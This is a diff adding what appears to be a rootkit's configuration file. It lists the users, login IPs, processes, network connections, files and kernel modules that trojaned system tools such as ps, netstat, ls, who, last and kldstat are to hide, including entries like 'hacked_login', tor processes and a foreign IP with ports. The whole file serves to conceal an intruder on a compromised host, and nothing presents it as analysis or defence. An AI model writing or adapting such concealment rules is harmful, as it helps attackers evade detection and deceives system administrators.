@@ -1,0 +1,105 @@
+################################################
+################ FIND ##########################
+## name - hide filez with such name
+find:name=/root/perl:/root/doc/perl
+###############################################
+
+
+################################################
+################ FSTAT #########################
+## user - hide this user
+## command - hide such command
+## command_user - hide with such command and user
+fstat:user=root
+fstat:command=tor
+fstat:command_user=csh-root:tor-_tor
+################################################
+
+
+################################################
+################ KLDSTAT #######################
+## name - hide name of this module
+kldstat:name=kernel:linux.ko
+################################################
+
+
+################################################
+################ LAST ##########################
+## ip - hide this ip
+## user - hide this user
+## ip_user - hide this user with such ip
+last:ip=192.168.10.32
+last:user=root:hacked_login
+last:ip_user=192.168.10.179-ftp
+################################################
+
+
+################################################
+################## LS ##########################
+## fullpath - hide this fullpath
+ls:fullpath=/root/.xinitrc:/root/perl
+################################################
+
+
+################################################
+################ NETSTAT #######################
+## fip - foreign IP
+## fp - foreign port
+## lp - local port
+netstat:fip=212.42.236.140
+netstat:fp=9092:5190
+netstat:lp=22
+################################################
+
+
+################################################
+################# PS ###########################
+## pid - hide by pid
+## command - hide by command
+ps:pid=1
+ps:command=Xorg:SHELL
+################################################
+
+
+################################################
+################## SOCKSTAT ####################
+## pid - hide by pid
+## uid_command  - hide by uid_user and command
+## user_command - hide by user name and command
+sockstat:user=squid
+sockstat:command=licq:mysqld
+sockstat:user_command=pgsql-postgres
+################################################
+
+
+################################################
+################# TOP ##########################
+## pid - hide this pid
+## command - hide this command
+top:pid=256
+top:command=Xorg
+################################################
+
+
+################################################
+################# WHO ##########################
+## user - hide this user
+## ip - hide this ip
+## ip_iser - hide this user with such ip
+who:user=root
+who:ip=192.168.10.31
+who:ip_user=192.168.10.31-root
+################################################
+
+
+################################################
+################### W ##########################
+## user - hide this user
+## ip - hide this ip
+## ip_iser - hide this user with such ip
+w:user=root
+w:ip=192.168.10.31
+w:ip_user=192.168.10.31-root
+################################################
+
+
